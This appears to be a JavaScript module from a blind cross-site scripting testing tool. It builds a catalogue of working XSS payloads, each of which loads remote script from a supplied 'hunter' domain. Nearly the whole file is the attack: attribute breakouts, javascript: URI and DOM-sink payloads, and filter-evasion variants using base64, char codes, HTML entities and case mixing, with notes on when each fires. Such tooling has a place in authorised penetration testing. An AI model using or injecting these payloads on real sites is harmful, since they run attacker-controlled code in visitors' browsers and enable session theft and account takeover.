const utils = require('./utils.js');

const html_encode = utils.html_encode;
const urlsafe_base64_encode = utils.urlsafe_base64_encode;

const CATEGORY_ATTRIBUTE_BREAKOUT = 'attribute_breakout';
const CATEGORY_URI_BASED = 'uri_based';
const CATEGORY_WAF_BYPASS = 'waf_bypass';
const CATEGORY_DOM_BASED = 'dom_based';

function js_attrib(base_domain) {
    return 'var a=document.createElement("script");a.src="https://' + base_domain + '";document.body.appendChild(a);';
}

function b64_js(base_domain) {
    return html_encode(urlsafe_base64_encode(js_attrib(base_domain)));
}

function case_mix(value) {
    return value.split('').map((character, index) => {
        return index % 2 === 0 ? character.toLowerCase() : character.toUpperCase();
    }).join('');
}

function entity_encode(value) {
    return value.split('').map((character) => {
        return '&#' + character.charCodeAt(0) + ';';
    }).join('');
}

function from_char_code(js) {
    return 'eval(String.fromCharCode(' + js.split('').map((character) => {
        return character.charCodeAt(0);
    }).join(',') + '))';
}

const categories = [
    { id: CATEGORY_ATTRIBUTE_BREAKOUT, label: 'Attribute Breakouts' },
    { id: CATEGORY_URI_BASED, label: 'URI / Link-Based' },
    { id: CATEGORY_WAF_BYPASS, label: 'WAF & Filter Bypass' },
    { id: CATEGORY_DOM_BASED, label: 'DOM-Based' },
    { id: 'all', label: 'All' },
];

const payloads = [
    {
        'id': 'basic_script',
        'category': CATEGORY_ATTRIBUTE_BREAKOUT,
        'title': 'Basic <code>&lt;script&gt;</code> Tag Payload',
        'description': 'Classic payload',
        'func': function(base_domain) {
            return "\"><script src=\"https://" + base_domain + "\"><\/script>";
        },
        'example': 'Inject into raw HTML output, e.g. a field rendered as <code>&lt;p&gt;PAYLOAD&lt;/p&gt;</code>.',
        'caveats': 'Fails if the app HTML-encodes quotes or filters <code>script</code> tags. Blocked by strict CSP (<code>script-src</code>).',
        'when': 'Works when your input lands in unencoded HTML output in any tag context.',
    },
    {
        'id': 'javascript_uri',
        'category': CATEGORY_URI_BASED,
        'title': '<code>javascript:</code> URI Payload',
        'description': 'Link-based XSS',
        'func': function(base_domain) {
            return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + base_domain + "\\';document.body.appendChild(a)')";
        },
        'example': 'Inject as an attribute value: <code>&lt;a href="PAYLOAD"&gt;Click&lt;/a&gt;</code>.',
        'caveats': 'Requires a user click. Blocked if the app restricts URI schemes.',
        'when': 'Works when input is reflected into <code>href</code>/<code>src</code> attributes without scheme filtering.',
    },
    {
        'id': 'input_onfocus',
        'category': CATEGORY_ATTRIBUTE_BREAKOUT,
        'title': '<code>&lt;input&gt;</code> Tag Payload',
        'description': 'HTML5 input-based payload',
        'func': function(base_domain) {
            return "\"><input onfocus=eval(atob(this.id)) id=" + b64_js(base_domain) + " autofocus>";
        },
        'example': 'Inject into a quoted attribute: <code>&lt;input value="PAYLOAD"&gt;</code> — the leading <code>"&gt;</code> breaks out.',
        'caveats': 'Needs focus to land on the element; <code>autofocus</code> can be blocked in sandboxed iframes. The loader is base64-encoded to dodge filters.',
        'when': 'Works for input reflected inside a double-quoted HTML attribute without encoding.',
    },
    {
        'id': 'image_onerror',
        'category': CATEGORY_ATTRIBUTE_BREAKOUT,
        'title': '<code>&lt;img&gt;</code> Tag Payload',
        'description': 'Image-based payload',
        'func': function(base_domain) {
            return "\"><img src=x id=" + b64_js(base_domain) + " onerror=eval(atob(this.id))>";
        },
        'example': 'Inject into a quoted attribute: <code>&lt;div title="PAYLOAD"&gt;</code>.',
        'caveats': 'Fails if <code>img</code> or <code>onerror</code> is filtered. Blocked if images/event handlers are sanitized.',
        'when': 'Works for attribute injection; fires immediately on parse with no user interaction.',
    },
    {
        'id': 'video_source',
        'category': CATEGORY_ATTRIBUTE_BREAKOUT,
        'title': '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
        'description': 'Video-based payload',
        'func': function(base_domain) {
            return "\"><video><source onerror=eval(atob(this.id)) id=" + b64_js(base_domain) + ">";
        },
        'example': 'Inject into a quoted attribute, e.g. <code>&lt;img alt="PAYLOAD"&gt;</code>.',
        'caveats': 'Useful when <code>img</code> is filtered but media tags are allowed.',
        'when': 'Works for attribute injection where the filter blocks <code>img</code> but not <code>video</code>/<code>source</code>.',
    },
    {
        'id': 'iframe_srcdoc',
        'category': CATEGORY_ATTRIBUTE_BREAKOUT,
        'title': '<code>&lt;iframe srcdoc=</code> Tag Payload',
        'description': 'iframe-based payload',
        'func': function(base_domain) {
            return "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;" + base_domain + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">";
        },
        'example': 'Inject into a quoted attribute: <code>&lt;div data-x="PAYLOAD"&gt;</code>.',
        'caveats': 'The <code>srcdoc</code> content is HTML-entity encoded to survive attribute parsing. Fails if <code>iframe</code> tags or <code>srcdoc</code> are stripped.',
        'when': 'Works for attribute injection where nested markup must survive attribute-value parsing.',
    },
    {
        'id': 'xmlhttprequest_load',
        'category': CATEGORY_WAF_BYPASS,
        'title': 'XMLHttpRequest Payload',
        'description': 'Inline execution chainload payload',
        'func': function(base_domain) {
            return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://' + base_domain + '");a.send();<\/script>';
        },
        'example': 'Inject into raw HTML where inline scripts run: <code>&lt;div&gt;PAYLOAD&lt;/div&gt;</code>.',
        'caveats': 'Requires CORS from your hunter domain for the read, and <code>unsafe-eval</code> if CSP is present. Long payload.',
        'when': 'Works when the WAF strips <code>&lt;script src=...&gt;</code> patterns but allows inline script blocks.',
    },
    {
        'id': 'jquery_chainload',
        'category': CATEGORY_DOM_BASED,
        'title': '<code>$.getScript()</code> (jQuery) Payload',
        'description': 'Chainload payload for sites with jQuery',
        'func': function(base_domain) {
            return '<script>$.getScript("https://' + base_domain + '")<\/script>';
        },
        'example': 'Inject into raw HTML on a page that loads jQuery.',
        'caveats': 'Throws (silently) if jQuery is not present when the payload runs.',
        'when': 'Works when inline scripts execute and jQuery is loaded; shorter than the XHR variant.',
    },
    {
        'id': 'svg_onload',
        'category': CATEGORY_ATTRIBUTE_BREAKOUT,
        'title': '<code>&lt;svg onload&gt;</code> Tag Payload',
        'description': 'SVG-based payload',
        'func': function(base_domain) {
            return "\"><svg onload=eval(atob(this.id)) id=" + b64_js(base_domain) + ">";
        },
        'example': 'Inject into a quoted attribute: <code>&lt;div title="PAYLOAD"&gt;</code>.',
        'caveats': 'Fails if <code>svg</code> or <code>onload</code> is filtered.',
        'when': 'Works for attribute injection where <code>img</code> is filtered but <code>svg</code> is allowed; fires immediately on parse.',
    },
    {
        'id': 'details_ontoggle',
        'category': CATEGORY_ATTRIBUTE_BREAKOUT,
        'title': '<code>&lt;details open ontoggle&gt;</code> Tag Payload',
        'description': 'Details/summary-based payload',
        'func': function(base_domain) {
            return "\"><details open ontoggle=eval(atob(this.id)) id=" + b64_js(base_domain) + ">";
        },
        'example': 'Inject into a quoted attribute: <code>&lt;span data-id="PAYLOAD"&gt;</code>.',
        'caveats': 'Needs the <code>open</code> attribute for <code>ontoggle</code> to fire automatically. Fails if <code>details</code> is stripped.',
        'when': 'Works for attribute injection where <code>svg</code> is blocked but <code>details</code> passes.',
    },
    {
        'id': 'body_onload',
        'category': CATEGORY_ATTRIBUTE_BREAKOUT,
        'title': '<code>&lt;body onload&gt;</code> Tag Payload',
        'description': 'Body element payload',
        'func': function(base_domain) {
            return "\"><body onload=eval(atob(this.id)) id=" + b64_js(base_domain) + ">";
        },
        'example': 'Inject into HTML <code>&lt;head&gt;</code> output or a <code>document.write()</code> sink.',
        'caveats': 'Injecting a second <code>&lt;body&gt;</code> into an already-parsed page does NOT fire <code>onload</code>. Only fires when the payload is part of the initial document parse.',
        'when': 'Works for head/document.write injection where event-handler tags are filtered but <code>body</code> passes.',
    },
    {
        'id': 'marquee_onstart',
        'category': CATEGORY_ATTRIBUTE_BREAKOUT,
        'title': '<code>&lt;marquee onstart&gt;</code> Tag Payload',
        'description': 'Legacy marquee payload',
        'func': function(base_domain) {
            return "\"><marquee onstart=eval(atob(this.id)) id=" + b64_js(base_domain) + ">";
        },
        'example': 'Inject into a quoted attribute: <code>&lt;td title="PAYLOAD"&gt;</code>.',
        'caveats': 'Legacy element — browsers still execute it for compatibility, but some sanitizers strip it. Consider it a niche fallback.',
        'when': 'Works when modern tags are filtered but the filter misses legacy elements.',
    },
    {
        'id': 'select_autofocus',
        'category': CATEGORY_ATTRIBUTE_BREAKOUT,
        'title': '<code>&lt;select autofocus&gt;</code> Tag Payload',
        'description': 'Select-element payload',
        'func': function(base_domain) {
            return "\"><select autofocus onfocus=eval(atob(this.id)) id=" + b64_js(base_domain) + ">";
        },
        'example': 'Inject into a quoted attribute: <code>&lt;input name="PAYLOAD"&gt;</code>.',
        'caveats': 'If <code>autofocus</code> is stripped, the payload still fires when the user clicks the element.',
        'when': 'Works for attribute injection where input/img are filtered but <code>select</code> passes.',
    },
    {
        'id': 'anchor_javascript',
        'category': CATEGORY_URI_BASED,
        'title': '<code>&lt;a href="javascript:"&gt;</code> Tag Payload',
        'description': 'Clickable link payload',
        'func': function(base_domain) {
            return "<a href=\"javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + base_domain + "\\';document.body.appendChild(a)')\">Click here</a>";
        },
        'example': 'Inject into raw HTML output: the payload renders as a clickable link.',
        'caveats': 'Requires a user click. Blocked by URI-scheme filters.',
        'when': 'Works for raw HTML injection where script tags are filtered but anchor tags and javascript: URIs pass.',
    },
    {
        'id': 'meta_refresh',
        'category': CATEGORY_URI_BASED,
        'title': '<code>&lt;meta http-equiv="refresh"&gt;</code> Payload',
        'description': 'Meta-refresh based payload',
        'func': function(base_domain) {
            return "<meta http-equiv=\"refresh\" content=\"0;url=javascript:var a=document.createElement('script');a.src='https://" + base_domain + "';document.body.appendChild(a)\">";
        },
        'example': 'Inject into HTML <code>&lt;head&gt;</code> output.',
        'caveats': 'Blocked in Firefox. Avoid spaces/newlines inside the javascript: URL — this payload uses a space-free loader for that reason.',
        'when': 'Works (Chrome/Edge) for head injection where script tags are filtered but meta tags pass.',
    },
    {
        'id': 'object_data',
        'category': CATEGORY_URI_BASED,
        'title': '<code>&lt;object data="javascript:"&gt;</code> Payload',
        'description': 'Object-element payload',
        'func': function(base_domain) {
            return "<object data=\"javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + base_domain + "\\';document.body.appendChild(a)')\">";
        },
        'example': 'Inject into raw HTML output.',
        'caveats': 'Legacy vector — modern Chrome/Firefox mostly ignore javascript: in object data. Prefer iframe or SVG variants.',
        'when': 'Rarely works on modern browsers; useful against old embedded browsers (kiosks, legacy apps).',
    },
    {
        'id': 'iframe_data_uri',
        'category': CATEGORY_URI_BASED,
        'title': '<code>&lt;iframe src="data:text/html"&gt;</code> Payload',
        'description': 'data: URI iframe payload',
        'func': function(base_domain) {
            return "<iframe src=\"data:text/html," + encodeURIComponent("<script src=\"https://" + base_domain + "\"><\/script>") + "\">";
        },
        'example': 'Inject into a quoted attribute: <code>&lt;iframe src="PAYLOAD"&gt;</code>.',
        'caveats': 'The embedded document has an opaque origin; the hunter script still loads, but sandboxed iframes or frame-src CSP may block it.',
        'when': 'Works for attribute injection where the value is expected to be a URL and script-tag injection is not possible.',
    },
    {
        'id': 'svg_xlink_href',
        'category': CATEGORY_URI_BASED,
        'title': '<code>&lt;svg&gt;&lt;a xlink:href&gt;</code> Payload',
        'description': 'SVG link payload',
        'func': function(base_domain) {
            return "<svg><a xlink:href=\"javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + base_domain + "\\';document.body.appendChild(a)')\" href=\"javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + base_domain + "\\';document.body.appendChild(a)')\"><text>Click</text></a></svg>";
        },
        'example': 'Inject into raw HTML output; the payload renders as a clickable SVG text.',
        'caveats': 'Requires a user click. Both <code>xlink:href</code> and <code>href</code> are included for browser compatibility (SVG2 uses href).',
        'when': 'Works when the filter allows svg/a markup and javascript: URIs, and the victim can be lured to click.',
    },
    {
        'id': 'case_mixed_onerror',
        'category': CATEGORY_WAF_BYPASS,
        'title': 'Case-Mixed <code>OnErRoR</code> Payload',
        'description': 'Case-obfuscated image payload',
        'func': function(base_domain) {
            return case_mix("\"><img src=x") + " id=" + b64_js(base_domain) + " " + case_mix("onerror") + "=eval(atob(this.id))>";
        },
        'example': 'Inject into a quoted attribute: <code>&lt;div title="PAYLOAD"&gt;</code>.',
        'caveats': 'HTML is case-insensitive, so this only evades naive keyword filters that match lowercase exactly. Real WAFs are rarely fooled by it alone.',
        'when': 'Use when a filter blocks <code>onerror</code>/<code>img</code> literally; fires immediately on parse.',
    },
    {
        'id': 'entity_encoded_breakout',
        'category': CATEGORY_WAF_BYPASS,
        'title': 'HTML Entity Breakout Payload',
        'description': 'Entity-encoded attribute breakout',
        'func': function(base_domain) {
            return entity_encode('">') + "<img src=x id=" + b64_js(base_domain) + " onerror=eval(atob(this.id))>";
        },
        'example': 'Inject into a quoted attribute; the entities decode to <code>"&gt;</code> at render time and break out.',
        'caveats': 'Fails if the app double-encodes output (the entities would be visible as text). Pointless if the app already renders raw quotes.',
        'when': 'Use when input validators reject literal <code>"&lt;&gt;</code> characters but the app renders them as HTML.',
    },
    {
        'id': 'no_space_onerror',
        'category': CATEGORY_WAF_BYPASS,
        'title': 'No-Space <code>onerror</code> Payload',
        'description': 'Space-free attribute payload',
        'func': function(base_domain) {
            return "<img/src=x/onerror=eval(atob(this.id))/id=" + b64_js(base_domain) + ">";
        },
        'example': 'Inject into a quoted attribute: <code>&lt;div title="PAYLOAD"&gt;</code>.',
        'caveats': 'Relies on browsers parsing attributes separated by <code>/</code> instead of whitespace. Fails if the app normalizes markup.',
        'when': 'Use when the filter strips spaces or whitespace-normalizes attribute lists.',
    },
    {
        'id': 'protocol_relative_script',
        'category': CATEGORY_WAF_BYPASS,
        'title': 'Protocol-Relative <code>script src=//</code> Payload',
        'description': 'Scheme-less script payload',
        'func': function(base_domain) {
            return '<script src="//' + base_domain + '"><\/script>';
        },
        'example': 'Inject into raw HTML output.',
        'caveats': 'Inherits http/https from the page; broken on <code>file:</code> pages. Blocked if the filter strips <code>//</code> URLs.',
        'when': 'Use when the app strips <code>http://</code> or <code>https://</code> strings from URLs.',
    },
    {
        'id': 'from_char_code_loader',
        'category': CATEGORY_WAF_BYPASS,
        'title': '<code>String.fromCharCode</code> Loader Payload',
        'description': 'Obfuscated inline script payload',
        'func': function(base_domain) {
            return '<script>' + from_char_code(js_attrib(base_domain)) + '<\/script>';
        },
        'example': 'Inject into raw HTML output.',
        'caveats': 'Blocked by CSP <code>unsafe-eval</code>. Long payload; the entire loader including your domain is hidden as char codes.',
        'when': 'Use when the WAF blocks the literal hunter domain or <code>script src=</code> patterns in script blocks.',
    },
    {
        'id': 'template_literal_loader',
        'category': CATEGORY_WAF_BYPASS,
        'title': 'Backtick Template Literal Loader Payload',
        'description': 'Quote-free inline script payload',
        'func': function(base_domain) {
            return '<script>document.body.appendChild(Object.assign(document.createElement(`script`),{src:`https://' + base_domain + '`}))<\/script>';
        },
        'example': 'Inject into raw HTML output.',
        'caveats': 'Uses no single or double quotes — only backticks. Does not work on legacy browsers without template literal support.',
        'when': 'Use when the filter escapes or strips single/double quotes but leaves backticks alone.',
    },
    {
        'id': 'jquery_html_sink',
        'category': CATEGORY_DOM_BASED,
        'title': '<code>innerHTML</code> / jQuery <code>.html()</code> Sink Payload',
        'description': 'DOM sink fragment payload',
        'func': function(base_domain) {
            return "<img src=x id=" + b64_js(base_domain) + " onerror=eval(atob(this.id))>";
        },
        'example': 'Inject directly into a JS sink: <code>$("#output").html(PAYLOAD)</code> or <code>element.innerHTML = PAYLOAD</code>. No attribute breakout needed.',
        'caveats': 'Only valid when input lands inside a JS string that feeds an HTML sink. In an attribute context it renders as literal text.',
        'when': 'Works for DOM XSS sinks where the app itself inserts your input into the DOM via innerHTML/html().',
    },
    {
        'id': 'postmessage_receiver',
        'category': CATEGORY_DOM_BASED,
        'title': '<code>postMessage</code> Receiver Payload',
        'description': 'Message-triggered payload',
        'func': function(base_domain) {
            return "<script>addEventListener('message',function(e){var a=document.createElement('script');a.src='https://" + base_domain + "';document.body.appendChild(a)})<\/script>";
        },
        'example': 'Inject a full script block into a page that receives <code>window.postMessage</code> calls from other windows.',
        'caveats': 'Fires only when the victim page receives a postMessage. The listener is not origin-filtered on purpose (maximize reachability).',
        'when': 'Use when you can inject a full script block and want the payload to fire when messages flow (e.g. OAuth/payment popup flows).',
    },
];

const helpers = {
    js_attrib: js_attrib,
    b64_js: b64_js,
    case_mix: case_mix,
    entity_encode: entity_encode,
    from_char_code: from_char_code,
};

module.exports = {
    categories: categories,
    payloads: payloads,
    helpers: helpers,
};
